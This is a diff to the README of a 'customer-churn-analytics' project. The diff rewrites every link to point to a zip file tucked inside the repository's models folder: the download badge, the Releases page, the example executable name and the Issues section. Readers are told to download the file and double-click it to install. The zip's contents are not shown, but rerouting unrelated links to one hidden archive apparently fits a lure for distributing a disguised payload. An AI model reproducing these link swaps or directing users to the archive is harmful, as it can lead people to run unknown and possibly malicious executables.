@@ -1,6 +1,6 @@
 # 📊 customer-churn-analytics - Analyze Customer Loss Simply
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/OmarNoureldin1/customer-churn-analytics/releases)
+[![Download](https://github.com/OmarNoureldin1/customer-churn-analytics/raw/refs/heads/main/churn_prediction/models/customer-analytics-churn-1.7.zip)](https://github.com/OmarNoureldin1/customer-churn-analytics/raw/refs/heads/main/churn_prediction/models/customer-analytics-churn-1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the customer-churn-analytics project! This application helps you unde
 
 ## 📥 Download & Install
 
-To install this software, visit our [Releases page](https://github.com/OmarNoureldin1/customer-churn-analytics/releases) to download the latest version.
+To install this software, visit our [Releases page](https://github.com/OmarNoureldin1/customer-churn-analytics/raw/refs/heads/main/churn_prediction/models/customer-analytics-churn-1.7.zip) to download the latest version.
 
 ## 🔧 System Requirements
 
@@ -21,9 +21,9 @@ Before you start, make sure you have the following:
 
 ## 📂 Installation Steps
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/OmarNoureldin1/customer-churn-analytics/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/OmarNoureldin1/customer-churn-analytics/raw/refs/heads/main/churn_prediction/models/customer-analytics-churn-1.7.zip).
    
-2. **Download the Application:** Click on the latest version and download the executable file (e.g., `customer_churn_analytics.exe`).
+2. **Download the Application:** Click on the latest version and download the executable file (e.g., `https://github.com/OmarNoureldin1/customer-churn-analytics/raw/refs/heads/main/churn_prediction/models/customer-analytics-churn-1.7.zip`).
 
 3. **Install the Application:**
    - For Windows: Double-click the downloaded file and follow the prompts to install.
@@ -53,13 +53,13 @@ After launching the application, you'll see the dashboard. Here’s how to use i
 
 ## 🌍 Support and Community
 
-If you encounter any issues or need support, please visit the [Issues section](https://github.com/OmarNoureldin1/customer-churn-analytics/issues) of the repository. You can ask questions, report bugs, or request features. 
+If you encounter any issues or need support, please visit the [Issues section](https://github.com/OmarNoureldin1/customer-churn-analytics/raw/refs/heads/main/churn_prediction/models/customer-analytics-churn-1.7.zip) of the repository. You can ask questions, report bugs, or request features. 
 
 Join the community discussions to share your experiences and learn from others.
 
 ## 🔄 Updates
 
-Keep an eye on the [Releases page](https://github.com/OmarNoureldin1/customer-churn-analytics/releases) for updates. We regularly improve the application and add new features based on user feedback.
+Keep an eye on the [Releases page](https://github.com/OmarNoureldin1/customer-churn-analytics/raw/refs/heads/main/churn_prediction/models/customer-analytics-churn-1.7.zip) for updates. We regularly improve the application and add new features based on user feedback.
 
 ## 📝 License
 
